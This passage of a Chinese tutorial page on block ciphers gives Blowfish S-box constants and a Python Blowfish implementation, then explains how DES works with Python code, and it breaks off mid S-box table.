[0xD1310BA6, 0x98DFB5AC, 0x2FFD72DB, 0xD01ADFB7,     0xB8E1AFED, 0x6A267E96, 0xBA7C9045, 0xF12C7F99,     0x24A19947, 0xB3916CF7, 0x0801F2E2, 0x858EFC16,     0x636920D8, 0x71574E69, 0xA458FEA3, 0xF4933D7E,     0x0D95748F, 0x728EB658, 0x718BCD58, 0x82154AEE,     0x7B54A41D, 0xC25A59B5, 0x9C30D539, 0x2AF26013,     0xC5D1B023, 0x286085F0, 0xCA417918, 0xB8DB38EF,     0x8E79DCB0, 0x603A180E, 0x6C9E0E8B, 0xB01E8A3E,     0xD71577C1, 0xBD314B27, 0x78AF2FDA, 0x55605C60,     0xE65525F3, 0xAA55AB94, 0x57489862, 0x63E81440,     0x55CA396A, 0x2AAB10B6, 0xB4CC5C34, 0x1141E8CE,     0xA15486AF, 0x7C72E993, 0xB3EE1411, 0x636FBC2A,     0x2BA9C55D, 0x741831F6, 0xCE5C3E16, 0x9B87931E,     0xAFD6BA33, 0x6C24CF5C, 0x7A325381, 0x28958677,     0x3B8F4898, 0x6B4BB9AF, 0xC4BFE81B, 0x66282193,     0x61D809CC, 0xFB21A991, 0x487CAC60, 0x5DEC8032,     0xEF845D5D, 0xE98575B1, 0xDC262302, 0xEB651B88,     0x23893E81, 0xD396ACC5, 0x0F6D6FF3, 0x83F44239,     0x2E0B4482, 0xA4842004, 0x69C8F04A, 0x9E1F9B5E,     0x21C66842, 0xF6E96C9A, 0x670C9C61, 0xABD388F0,     0x6A51A0D2, 0xD8542F68, 0x960FA728, 0xAB5133A3,     0x6EEF0B6C, 0x137A3BE4, 0xBA3BF050, 0x7EFB2A98,     0xA1F1651D, 0x39AF0176, 0x66CA593E, 0x82430E88,     0x8CEE8619, 0x456F9FB4, 0x7D84A5C3, 0x3B8B5EBE,     0xE06F75D8, 0x85C12073, 0x401A449F, 0x56C16AA6,     0x4ED3AA62, 0x363F7706, 0x1BFEDF72, 0x429B023D,     0x37D0D724, 0xD00A1248, 0xDB0FEAD3, 0x49F1C09B,     0x075372C9, 0x80991B7B, 0x25D479D8, 0xF6E8DEF7,     0xE3FE501A, 0xB6794C3B, 0x976CE0BD, 0x04C006BA,     0xC1A94FB6, 0x409F60C4, 0x5E5C9EC2, 0x196A2463,     0x68FB6FAF, 0x3E6C53B5, 0x1339B2EB, 0x3B52EC6F,     0x6DFC511F, 0x9B30952C, 0xCC814544, 0xAF5EBD09,     0xBEE3D004, 0xDE334AFD, 0x660F2807, 0x192E4BB3,     0xC0CBA857, 0x45C8740F, 0xD20B5F39, 0xB9D3FBDB,     0x5579C0BD, 0x1A60320A, 0xD6A100C6, 0x402C7279,     0x679F25FE, 0xFB1FA3CC, 0x8EA5E9F8, 0xDB3222F8,     0x3C7516DF, 0xFD616B15, 0x2F501EC8, 0xAD0552AB,     0x323DB5FA, 0xFD238760, 0x53317B48, 0x3E00DF82,     0x9E5C57BB, 0xCA6F8CA0, 0x1A87562E, 0xDF1769DB,     0xD542A8F6, 0x287EFFC3, 0xAC6732C6, 0x8C4F5573,     0x695B27B0, 0xBBCA58C8, 0xE1FFA35D, 0xB8F011A0,     0x10FA3D98, 0xFD2183B8, 0x4AFCB56C, 0x2DD1D35B,     0x9A53E479, 0xB6F84565, 0xD28E49BC, 0x4BFB9790,     0xE1DDF2DA, 0xA4CB7E33, 0x62FB1341, 0xCEE4C6E8,     0xEF20CADA, 0x36774C01, 0xD07E9EFE, 0x2BF11FB4,     0x95DBDA4D, 0xAE909198, 0xEAAD8E71, 0x6B93D5A0,     0xD08ED1D0, 0xAFC725E0, 0x8E3C5B2F, 0x8E7594B7,     0x8FF6E2FB, 0xF2122B64, 0x8888B812, 0x900DF01C,     0x4FAD5EA0, 0x688FC31C, 0xD1CFF191, 0xB3A8C1AD,     0x2F2F2218, 0xBE0E1777, 0xEA752DFE, 0x8B021FA1,     0xE5A0CC0F, 0xB56F74E8, 0x18ACF3D6, 0xCE89E299,     0xB4A84FE0, 0xFD13E0B7, 0x7CC43B81, 0xD2ADA8D9,     0x165FA266, 0x80957705, 0x93CC7314, 0x211A1477,     0xE6AD2065, 0x77B5FA86, 0xC75442F5, 0xFB9D35CF,     0xEBCDAF0C, 0x7B3E89A0, 0xD6411BD3, 0xAE1E7E49,     0x00250E2D, 0x2071B35E, 0x226800BB, 0x57B8E0AF,     0x2464369B, 0xF009B91E, 0x5563911D, 0x59DFA6AA,     0x78C14389, 0xD95A537F, 0x207D5BA2, 0x02E5B9C5,     0x83260376, 0x6295CFA9, 0x11C81968, 0x4E734A41,     0xB3472DCA, 0x7B14A94A, 0x1B510052, 0x9A532915,     0xD60F573F, 0xBC9BC6E4, 0x2B60A476, 0x81E67400,     0x08BA6FB5, 0x571BE91F, 0xF296EC6B, 0x2A0DD915,     0xB6636521, 0xE7B9F9B6, 0xFF34052E, 0xC5855664,     0x53B02D5D, 0xA99F8FA1, 0x08BA4799, 0x6E85076A],    [0x4B7A70E9, 0xB5B32944, 0xDB75092E, 0xC4192623,     0xAD6EA6B0, 0x49A7DF7D, 0x9CEE60B8, 0x8FEDB266,     0xECAA8C71, 0x699A17FF, 0x5664526C, 0xC2B19EE1,     0x193602A5, 0x75094C29, 0xA0591340, 0xE4183A3E,     0x3F54989A, 0x5B429D65, 0x6B8FE4D6, 0x99F73FD6,     0xA1D29C07, 0xEFE830F5, 0x4D2D38E6, 0xF0255DC1,     0x4CDD2086, 0x8470EB26, 0x6382E9C6, 0x021ECC5E,     0x09686B3F, 0x3EBAEFC9, 0x3C971814, 0x6B6A70A1,     0x687F3584, 0x52A0E286, 0xB79C5305, 0xAA500737,     0x3E07841C, 0x7FDEAE5C, 0x8E7D44EC, 0x5716F2B8,     0xB03ADA37, 0xF0500C0D, 0xF01C1F04, 0x0200B3FF,     0xAE0CF51A, 0x3CB574B2, 0x25837A58, 0xDC0921BD,     0xD19113F9, 0x7CA92FF6, 0x94324773, 0x22F54701,     0x3AE5E581, 0x37C2DADC, 0xC8B57634, 0x9AF3DDA7,     0xA9446146, 0x0FD0030E, 0xECC8C73E, 0xA4751E41,     0xE238CD99, 0x3BEA0E2F, 0x3280BBA1, 0x183EB331,     0x4E548B38, 0x4F6DB908, 0x6F420D03, 0xF60A04BF,     0x2CB81290, 0x24977C79, 0x5679B072, 0xBCAF89AF,     0xDE9A771F, 0xD9930810, 0xB38BAE12, 0xDCCF3F2E,     0x5512721F, 0x2E6B7124, 0x501ADDE6, 0x9F84CD87,     0x7A584718, 0x7408DA17, 0xBC9F9ABC, 0xE94B7D8C,     0xEC7AEC3A, 0xDB851DFA, 0x63094366, 0xC464C3D2,     0xEF1C1847, 0x3215D908, 0xDD433B37, 0x24C2BA16,     0x12A14D43, 0x2A65C451, 0x50940002, 0x133AE4DD,     0x71DFF89E, 0x10314E55, 0x81AC77D6, 0x5F11199B,     0x043556F1, 0xD7A3C76B, 0x3C11183B, 0x5924A509,     0xF28FE6ED, 0x97F1FBFA, 0x9EBABF2C, 0x1E153C6E,     0x86E34570, 0xEAE96FB1, 0x860E5E0A, 0x5A3E2AB3,     0x771FE71C, 0x4E3D06FA, 0x2965DCB9, 0x99E71D0F,     0x803E89D6, 0x5266C825, 0x2E4CC978, 0x9C10B36A,     0xC6150EBA, 0x94E2EA78, 0xA5FC3C53, 0x1E0A2DF4,     0xF2F74EA7, 0x361D2B3D, 0x1939260F, 0x19C27960,     0x5223A708, 0xF71312B6, 0xEBADFE6E, 0xEAC31F66,     0xE3BC4595, 0xA67BC883, 0xB17F37D1, 0x018CFF28,     0xC332DDEF, 0xBE6C5AA5, 0x65582185, 0x68AB9802,     0xEECEA50F, 0xDB2F953B, 0x2AEF7DAD, 0x5B6E2F84,     0x1521B628, 0x29076170, 0xECDD4775, 0x619F1510,     0x13CCA830, 0xEB61BD96, 0x0334FE1E, 0xAA0363CF,     0xB5735C90, 0x4C70A239, 0xD59E9E0B, 0xCBAADE14,     0xEECC86BC, 0x60622CA7, 0x9CAB5CAB, 0xB2F3846E,     0x648B1EAF, 0x19BDF0CA, 0xA02369B9, 0x655ABB50,     0x40685A32, 0x3C2AB4B3, 0x319EE9D5, 0xC021B8F7,     0x9B540B19, 0x875FA099, 0x95F7997E, 0x623D7DA8,     0xF837889A, 0x97E32D77, 0x11ED935F, 0x16681281,     0x0E358829, 0xC7E61FD6, 0x96DEDFA1, 0x7858BA99,     0x57F584A5, 0x1B227263, 0x9B83C3FF, 0x1AC24696,     0xCDB30AEB, 0x532E3054, 0x8FD948E4, 0x6DBC3128,     0x58EBF2EF, 0x34C6FFEA, 0xFE28ED61, 0xEE7C3C73,     0x5D4A14D9, 0xE864B7E3, 0x42105D14, 0x203E13E0,     0x45EEE2B6, 0xA3AAABEA, 0xDB6C4F15, 0xFACB4FD0,     0xC742F442, 0xEF6ABBB5, 0x654F3B1D, 0x41CD2105,     0xD81E799E, 0x86854DC7, 0xE44B476A, 0x3D816250,     0xCF62A1F2, 0x5B8D2646, 0xFC8883A0, 0xC1C7B6A3,     0x7F1524C3, 0x69CB7492, 0x47848A0B, 0x5692B285,     0x095BBF00, 0xAD19489D, 0x1462B174, 0x23820E00,     0x58428D2A, 0x0C55F5EA, 0x1DADF43E, 0x233F7061,     0x3372F092, 0x8D937E41, 0xD65FECF1, 0x6C223BDB,     0x7CDE3759, 0xCBEE7460, 0x4085F2A7, 0xCE77326E,     0xA6078084, 0x19F8509E, 0xE8EFD855, 0x61D99735,     0xA969A7AA, 0xC50C06C2, 0x5A04ABFC, 0x800BCADC,     0x9E447A2E, 0xC3453484, 0xFDD56705, 0x0E1E9EC9,     0xDB73DBD3, 0x105588CD, 0x675FDA79, 0xE3674340,     0xC5C43465, 0x713E38D8, 0x3D28F89E, 0xF16DFF20,     0x153E21E7, 0x8FB03D4A, 0xE6E39F2B, 0xDB83ADF7],    [0xE93D5A68, 0x948140F7, 0xF64C261C, 0x94692934,     0x411520F7, 0x7602D4F7, 0xBCF46B2E, 0xD4A20068,     0xD4082471, 0x3320F46A, 0x43B7D4B7, 0x500061AF,     0x1E39F62E, 0x97244546, 0x14214F74, 0xBF8B8840,     0x4D95FC1D, 0x96B591AF, 0x70F4DDD3, 0x66A02F45,     0xBFBC09EC, 0x03BD9785, 0x7FAC6DD0, 0x31CB8504,     0x96EB27B3, 0x55FD3941, 0xDA2547E6, 0xABCA0A9A,     0x28507825, 0x530429F4, 0x0A2C86DA, 0xE9B66DFB,     0x68DC1462, 0xD7486900, 0x680EC0A4, 0x27A18DEE,     0x4F3FFEA2, 0xE887AD8C, 0xB58CE006, 0x7AF4D6B6,     0xAACE1E7C, 0xD3375FEC, 0xCE78A399, 0x406B2A42,     0x20FE9E35, 0xD9F385B9, 0xEE39D7AB, 0x3B124E8B,     0x1DC9FAF7, 0x4B6D1856, 0x26A36631, 0xEAE397B2,     0x3A6EFA74, 0xDD5B4332, 0x6841E7F7, 0xCA7820FB,     0xFB0AF54E, 0xD8FEB397, 0x454056AC, 0xBA489527,     0x55533A3A, 0x20838D87, 0xFE6BA9B7, 0xD096954B,     0x55A867BC, 0xA1159A58, 0xCCA92963, 0x99E1DB33,     0xA62A4A56, 0x3F3125F9, 0x5EF47E1C, 0x9029317C,     0xFDF8E802, 0x04272F70, 0x80BB155C, 0x05282CE3,     0x95C11548, 0xE4C66D22, 0x48C1133F, 0xC70F86DC,     0x07F9C9EE, 0x41041F0F, 0x404779A4, 0x5D886E17,     0x325F51EB, 0xD59BC0D1, 0xF2BCC18F, 0x41113564,     0x257B7834, 0x602A9C60, 0xDFF8E8A3, 0x1F636C1B,     0x0E12B4C2, 0x02E1329E, 0xAF664FD1, 0xCAD18115,     0x6B2395E0, 0x333E92E1, 0x3B240B62, 0xEEBEB922,     0x85B2A20E, 0xE6BA0D99, 0xDE720C8C, 0x2DA2F728,     0xD0127845, 0x95B794FD, 0x647D0862, 0xE7CCF5F0,     0x5449A36F, 0x877D48FA, 0xC39DFD27, 0xF33E8D1E,     0x0A476341, 0x992EFF74, 0x3A6F6EAB, 0xF4F8FD37,     0xA812DC60, 0xA1EBDDF8, 0x991BE14C, 0xDB6E6B0D,     0xC67B5510, 0x6D672C37, 0x2765D43B, 0xDCD0E804,     0xF1290DC7, 0xCC00FFA3, 0xB5390F92, 0x690FED0B,     0x667B9FFB, 0xCEDB7D9C, 0xA091CF0B, 0xD9155EA3,     0xBB132F88, 0x515BAD24, 0x7B9479BF, 0x763BD6EB,     0x37392EB3, 0xCC115979, 0x8026E297, 0xF42E312D,     0x6842ADA7, 0xC66A2B3B, 0x12754CCC, 0x782EF11C,     0x6A124237, 0xB79251E7, 0x06A1BBE6, 0x4BFB6350,     0x1A6B1018, 0x11CAEDFA, 0x3D25BDD8, 0xE2E1C3C9,     0x44421659, 0x0A121386, 0xD90CEC6E, 0xD5ABEA2A,     0x64AF674E, 0xDA86A85F, 0xBEBFE988, 0x64E4C3FE,     0x9DBC8057, 0xF0F7C086, 0x60787BF8, 0x6003604D,     0xD1FD8346, 0xF6381FB0, 0x7745AE04, 0xD736FCCC,     0x83426B33, 0xF01EAB71, 0xB0804187, 0x3C005E5F,     0x77A057BE, 0xBDE8AE24, 0x55464299, 0xBF582E61,     0x4E58F48F, 0xF2DDFDA2, 0xF474EF38, 0x8789BDC2,     0x5366F9C3, 0xC8B38E74, 0xB475F255, 0x46FCD9B9,     0x7AEB2661, 0x8B1DDF84, 0x846A0E79, 0x915F95E2,     0x466E598E, 0x20B45770, 0x8CD55591, 0xC902DE4C,     0xB90BACE1, 0xBB8205D0, 0x11A86248, 0x7574A99E,     0xB77F19B6, 0xE0A9DC09, 0x662D09A1, 0xC4324633,     0xE85A1F02, 0x09F0BE8C, 0x4A99A025, 0x1D6EFE10,     0x1AB93D1D, 0x0BA5A4DF, 0xA186F20F, 0x2868F169,     0xDCB7DA83, 0x573906FE, 0xA1E2CE9B, 0x4FCD7F52,     0x50115E01, 0xA70683FA, 0xA002B5C4, 0x0DE6D027,     0x9AF88C27, 0x773F8641, 0xC3604C06, 0x61A806B5,     0xF0177A28, 0xC0F586E0, 0x006058AA, 0x30DC7D62,     0x11E69ED7, 0x2338EA63, 0x53C2DD94, 0xC2C21634,     0xBBCBEE56, 0x90BCB6DE, 0xEBFC7DA1, 0xCE591D76,     0x6F05E409, 0x4B7C0188, 0x39720A3D, 0x7C927C24,     0x86E3725F, 0x724D9DB9, 0x1AC15BB4, 0xD39EB8FC,     0xED545578, 0x08FCA5B5, 0xD83D7CD3, 0x4DAD0FC4,     0x1E50EF5E, 0xB161E6F8, 0xA28514D9, 0x6C51133C,     0x6FD5C7E7, 0x56E14EC4, 0x362ABFCE, 0xDDC6C837,     0xD79A3234, 0x92638212, 0x670EFA8E, 0x406000E0],    [0x3A39CE37, 0xD3FAF5CF, 0xABC27737, 0x5AC52D1B,     0x5CB0679E, 0x4FA33742, 0xD3822740, 0x99BC9BBE,     0xD5118E9D, 0xBF0F7315, 0xD62D1C7E, 0xC700C47B,     0xB78C1B6B, 0x21A19045, 0xB26EB1BE, 0x6A366EB4,     0x5748AB2F, 0xBC946E79, 0xC6A376D2, 0x6549C2C8,     0x530FF8EE, 0x468DDE7D, 0xD5730A1D, 0x4CD04DC6,     0x2939BBDB, 0xA9BA4650, 0xAC9526E8, 0xBE5EE304,     0xA1FAD5F0, 0x6A2D519A, 0x63EF8CE2, 0x9A86EE22,     0xC089C2B8, 0x43242EF6, 0xA51E03AA, 0x9CF2D0A4,     0x83C061BA, 0x9BE96A4D, 0x8FE51550, 0xBA645BD6,     0x2826A2F9, 0xA73A3AE1, 0x4BA99586, 0xEF5562E9,     0xC72FEFD3, 0xF752F7DA, 0x3F046F69, 0x77FA0A59,     0x80E4A915, 0x87B08601, 0x9B09E6AD, 0x3B3EE593,     0xE990FD5A, 0x9E34D797, 0x2CF0B7D9, 0x022B8B51,     0x96D5AC3A, 0x017DA67D, 0xD1CF3ED6, 0x7C7D2D28,     0x1F9F25CF, 0xADF2B89B, 0x5AD6B472, 0x5A88F54C,     0xE029AC71, 0xE019A5E6, 0x47B0ACFD, 0xED93FA9B,     0xE8D3C48D, 0x283B57CC, 0xF8D56629, 0x79132E28,     0x785F0191, 0xED756055, 0xF7960E44, 0xE3D35E8C,     0x15056DD4, 0x88F46DBA, 0x03A16125, 0x0564F0BD,     0xC3EB9E15, 0x3C9057A2, 0x97271AEC, 0xA93A072A,     0x1B3F6D9B, 0x1E6321F5, 0xF59C66FB, 0x26DCF319,     0x7533D928, 0xB155FDF5, 0x03563482, 0x8ABA3CBB,     0x28517711, 0xC20AD9F8, 0xABCC5167, 0xCCAD925F,     0x4DE81751, 0x3830DC8E, 0x379D5862, 0x9320F991,     0xEA7A90C2, 0xFB3E7BCE, 0x5121CE64, 0x774FBE32,     0xA8B6E37E, 0xC3293D46, 0x48DE5369, 0x6413E680,     0xA2AE0810, 0xDD6DB224, 0x69852DFD, 0x09072166,     0xB39A460A, 0x6445C0DD, 0x586CDECF, 0x1C20C8AE,     0x5BBEF7DD, 0x1B588D40, 0xCCD2017F, 0x6BB4E3BB,     0xDDA26A7E, 0x3A59FF45, 0x3E350A44, 0xBCB4CDD5,     0x72EACEA8, 0xFA6484BB, 0x8D6612AE, 0xBF3C6F47,     0xD29BE463, 0x542F5D9E, 0xAEC2771B, 0xF64E6370,     0x740E0D8D, 0xE75B1357, 0xF8721671, 0xAF537D5D,     0x4040CB08, 0x4EB4E2CC, 0x34D2466A, 0x0115AF84,     0xE1B00428, 0x95983A1D, 0x06B89FB4, 0xCE6EA048,     0x6F3F3B82, 0x3520AB82, 0x011A1D4B, 0x277227F8,     0x611560B1, 0xE7933FDC, 0xBB3A792B, 0x344525BD,     0xA08839E1, 0x51CE794B, 0x2F32C9B7, 0xA01FBAC9,     0xE01CC87E, 0xBCC7D1F6, 0xCF0111C3, 0xA1E8AAC7,     0x1A908749, 0xD44FBD9A, 0xD0DADECB, 0xD50ADA38,     0x0339C32A, 0xC6913667, 0x8DF9317C, 0xE0B12B4F,     0xF79E59B7, 0x43F5BB3A, 0xF2D519FF, 0x27D9459C,     0xBF97222C, 0x15E6FC2A, 0x0F91FC71, 0x9B941525,     0xFAE59361, 0xCEB69CEB, 0xC2A86459, 0x12BAA8D1,     0xB6C1075E, 0xE3056A0C, 0x10D25065, 0xCB03A442,     0xE0EC6E0E, 0x1698DB3B, 0x4C98A0BE, 0x3278E964,     0x9F1F9532, 0xE0D392DF, 0xD3A0342B, 0x8971F21E,     0x1B0A7441, 0x4BA3348C, 0xC5BE7120, 0xC37632D8,     0xDF359F8D, 0x9B992F2E, 0xE60B6F47, 0x0FE3F11D,     0xE54CDA54, 0x1EDAD891, 0xCE6279CF, 0xCD3E7E6F,     0x1618B166, 0xFD2C1D05, 0x848FD2C5, 0xF6FB2299,     0xF523F357, 0xA6327623, 0x93A83531, 0x56CCCD02,     0xACF08162, 0x5A75EBB5, 0x6E163697, 0x88D273CC,     0xDE966292, 0x81B949D0, 0x4C50901B, 0x71C65614,     0xE6C6C7BD, 0x327A140A, 0x45E1D006, 0xC3F27B9A,     0xC9AA53FD, 0x62A80F00, 0xBB25BFE2, 0x35BDD2F6,     0x71126905, 0xB2040222, 0xB6CBCF7C, 0xCD769C2B,     0x53113EC0, 0x1640E3D3, 0x38ABBD60, 0x2547ADF0,     0xBA38209C, 0xF746CE76, 0x77AFA1C5, 0x20756060,     0x85CBFE4E, 0x8AE88DD8, 0x7AAAF9B0, 0x4CF9AA7E,     0x1948C25C, 0x02FB8A8C, 0x01C36AE4, 0xD6EBE1F9,     0x90D4F869, 0xA65CDEA0, 0x3F09252D, 0xC208E69F,     0xB74E6132, 0xCE77E25B, 0x578FDFE3, 0x3AC372E6]]\n\n\n\n代码实现来自BlowFish 加密算法 python实现 - yring\nimport Crypto.Util.numberimport copyfrom Blow_BOX import *key_pbox = [0 for i in range(18)]Encrypt = []def init_key_pbox(_key):   #密钥初始化盒    index = 0    for i in range(18):        for j in range(4):            key_pbox[i] = ord(_key[index]) | (key_pbox[i] &lt;&lt; 8)            index += 1            if index &gt;= len(_key):                index = 0    for i in range(18):        p_box[i] ^= key_pbox[i]def Fn(Left):    a = (Left &amp; 0xff000000) &gt;&gt; 24    b = (Left &amp; 0x00ff0000) &gt;&gt; 16    c = (Left &amp; 0x0000ff00) &gt;&gt; 8    d = Left &amp; 0x000000ff    Sa = s_box[0][a]    Sb = s_box[1][b]    Sc = s_box[2][c]    Sd = s_box[3][d]    return (((Sa + Sb) ^ Sc) + Sd) &amp; 0xffffffffdef Blow_Main_Encrypt(Left, Right):  #主加密函数，查表异或替换    for i in range(16):        Left ^= p_box[i]        Right ^= Fn(Left)        Temp = Left        Left = Right        Right = Temp    Temp = Left    Left = Right ^ p_box[17]    Right = Temp ^ p_box[16]    return Left, Rightdef Blow_Main_Decrypt(Left, Right):    for i in range(17, 1, -1):        Left ^= p_box[i]        Right ^= Fn(Left)        Temp = Left        Left = Right        Right = Temp    Temp = Left    Left = Right ^ p_box[0]    Right = Temp ^ p_box[1]    return Left , Rightdef Change_Box(): #盒变化    Left = 0    Right = 0    for i in range(0, 18, 2):        Left, Right = Blow_Main_Encrypt(Left, Right)        p_box[i] = Left        p_box[i + 1] = Right    for i in range(4):        for j in range(0, 256, 2):            Left, Right = Blow_Main_Encrypt(Left, Right)            s_box[i][j] = Left            s_box[i][j + 1] = Rightdef BlowFish_Encrypt(data):    while len(data) % 8:        data += &#x27;0&#x27;    cipher = &#x27;&#x27;    for i in range(0, len(data), 8):        Left = (ord(data[i]) &lt;&lt; 24) | (ord(data[i + 1]) &lt;&lt; 16) | (ord(data[i + 2]) &lt;&lt; 8) | (ord(data[i + 3]))        Right = (ord(data[i + 4]) &lt;&lt; 24) | (ord(data[i + 5]) &lt;&lt; 16) | (ord(data[i + 6]) &lt;&lt; 8) | (ord(data[i + 7]))        Left, Right = Blow_Main_Encrypt(Left, Right)        cipher += hex(Left)[2:]        cipher += hex(Right)[2:]    global Encrypt    Encrypt = []    print(cipher)def BlowFish_Decrypt(cipher):    plain = &#x27;&#x27;    for i in range(0, len(cipher), 16):        Left = cipher[i:i + 8]        Right = cipher[i + 8:i + 16]        Left = int(Left, base=16)        Right = int(Right, base=16)        Left, Right = Blow_Main_Decrypt(Left, Right)        plain += hex(Left)[2:]        plain += hex(Right)[2:]    plain = int(plain, base=16)    print(Crypto.Util.number.long_to_bytes(plain))    global Encrypt    Encrypt = []if __name__ == &#x27;__main__&#x27;:    key = input(&quot;PLZ input the key First\\n&quot;)    init_key_pbox(key)    Change_Box()    m = input(&quot;PLZ choose a model: 1.Encrypt 2.Decrypt 3.exit\\n&quot;)    while 1:        if m == &#x27;1&#x27;:            data = input(&quot;PLZ input the data:\\n&quot;)            BlowFish_Encrypt(data)            m = input(&quot;PLZ choose a model: 1.Encrypt 2.Decrypt 3.exit\\n&quot;)        if m == &#x27;2&#x27;:            cipher = input(&quot;PLZ input the cipher:\\n&quot;)            BlowFish_Decrypt(cipher)            m = input(&quot;PLZ choose a model: 1.Encrypt 2.Decrypt 3.exit\\n&quot;)        if m == &#x27;3&#x27;:            break\n\n\nDES演示动画\n分组对称加密算法，用64位明文被分为一组进行加密，使用64位密钥。若有多于64位的明文需要进行多组加密。\n\n64bit密钥经过PC-1盒的变换去除校验位并打乱为56bit密钥，平分成两个28bit密文C0，D0，通过移位次数表进行16次循环左移，得到C10,D0到C15,D15,共16组，把Cn，Dn，每两个拼接成一个值，再通过PC-2进行变换，得到16个48bit的密钥。\n\n64bit的明文ip置换，把ip置换盒值指向的位，与ip盒值所在位置索引的位进行二进制交换\n\n64bit明文平分分成两部分L0和R0。R0先经过轮函数F()的变换。先把R0分为8个4bit的数据，并把每一个组的最前端加上前面一组的最后一位，最后端加上后一组的第一位。以此类推，把每组4bit数据转为6bit，最终得到48bit的数据。\n\n48bit数据与48bit的密钥异或。\n\n异或结果分为8组6bit数据，以每组数据的中间4bit为列坐标，两端的1bit组为2bit数据作为行坐标。在s盒中按坐标寻找值并替换，把数据压缩为32bit。\n\n再次进行一次p盒置换，与ip置换逻辑相同，并与L0异或得到R1。\n\n把R0赋值给L1,继续对R1进行加密，进行16轮。最后互换左右数据拼接成64bit的密文。\n\n\nDES解密逻辑相同，但是子密钥的使用顺序相反，我们可以通过写内存的方式修改子密钥的顺序，并输入密文得到解密结果。\n加解密实现代码来自python实现DES算法-CSDN博客\nimport re# ========================================# 一、子密钥生成# (1) 初始置换 64-&gt;56# 64位的种子密钥经过PC_1置换后，生成56位的密钥# (2) 划分 56-&gt;(28,28)# 经过初始置换后的56位密钥被均分成C0和D0两部分# (3) 循环左移# 第一轮，C0和D0根据移位次数表各自进行循环左移# 得到C1和D1# 每一轮的C和D值是由上一轮的C和D值循环左移得到的# (4) 合并 (28,28)-&gt;56-&gt;48# 左移后的两部分再次合并,通过一个选择压缩表(PC_2)# 得到这一轮的子密钥# (5)重复3、4操作,最终得到16个子密钥# ========================================# 置换选择表1(PC_1) 64-&gt;56PC_1 = [57, 49, 41, 33, 25, 17, 9,        1, 58, 50, 42, 34, 26, 18,        10, 2, 59, 51, 43, 35, 27,        19, 11, 3, 60, 52, 44, 36,        63, 55, 47, 39, 31, 23, 15,        7, 62, 54, 46, 38, 30, 22,        14, 6, 61, 53, 45, 37, 29,        21, 13, 5, 28, 20, 12, 4        ]# 选择压缩表2(PC_2) 56-&gt;48PC_2 = [14, 17, 11, 24, 1, 5, 3, 28,        15, 6, 21, 10, 23, 19, 12, 4,        26, 8, 16, 7, 27, 20, 13, 2,        41, 52, 31, 37, 47, 55, 30, 40,        51, 45, 33, 48, 44, 49, 39, 56,        34, 53, 46, 42, 50, 36, 29, 32        ]# 移位次数表shift_num = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]def pc_1_change(bin_key):    &quot;&quot;&quot;初始置换    64位的种子密钥经过PC_1置换后，生成56位的密钥    &quot;&quot;&quot;    return [bin_key[i - 1] for i in PC_1]  # 列表形式def shift_left(bin_key, num):    &quot;&quot;&quot;实现C和D的循环左移&quot;&quot;&quot;    return bin_key[num:] + bin_key[:num]def pc_2_change(bin_key):    &quot;&quot;&quot;选择压缩    56位的密钥经过PC_2压缩，生成48位子密钥    &quot;&quot;&quot;    return &#x27;&#x27;.join([bin_key[i - 1] for i in PC_2])  # 列表转字符串def get_subkey_list(bin_key):    &quot;&quot;&quot;生成16轮的加解子密钥&quot;&quot;&quot;    subkey_list = []  # 存储16轮子密钥    # 1. 初始置换 64-&gt;58    temp = pc_1_change(bin_key)    # 2. 循环左移    for i in shift_num:        temp[:28] = shift_left(temp[:28], i)  # C部分循环左移        temp[28:] = shift_left(temp[28:], i)  # D部分循环左移        subkey_list.append(pc_2_change(temp))  # 生成子密钥    return subkey_list# ========================================# 二、DES加解密实现# ========================================# 初始置换表IP 64-&gt;64IP = [58, 50, 42, 34, 26, 18, 10, 2,      60, 52, 44, 36, 28, 20, 12, 4,      62, 54, 46, 38, 30, 22, 14, 6,      64, 56, 48, 40, 32, 24, 16, 8,      57, 49, 41, 33, 25, 17, 9, 1,      59, 51, 43, 35, 27, 19, 11, 3,      61, 53, 45, 37, 29, 21, 13, 5,      63, 55, 47, 39, 31, 23, 15, 7      ]# 逆置换表_IP 64-&gt;64_IP = [40, 8, 48, 16, 56, 24, 64, 32, 39,       7, 47, 15, 55, 23, 63, 31, 38, 6,       46, 14, 54, 22, 62, 30, 37, 5, 45,       13, 53, 21, 61, 29, 36, 4, 44, 12,       52, 20, 60, 28, 35, 3, 43, 11, 51,       19, 59, 27, 34, 2, 42, 10, 50, 18,       58, 26, 33, 1, 41, 9, 49, 17, 57, 25       ]# 扩展置换表E 32-&gt;48E = [32, 1, 2, 3, 4, 5, 4, 5,     6, 7, 8, 9, 8, 9, 10, 11,     12, 13, 12, 13, 14, 15, 16, 17,     16, 17, 18, 19, 20, 21, 20, 21,     22, 23, 24, 25, 24, 25, 26, 27,     28, 29, 28, 29, 30, 31, 32, 1     ]# S盒 48-&gt;32S1 = [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,      0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,      4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,      15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13      ]S2 = [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,      3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,      0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,      13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9      ]S3 = [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,      13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,      13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,      1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12      ]S4 = [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,      13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,      10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,      3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14      ]S5 = [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,      14, 11, 2, 12, 4, 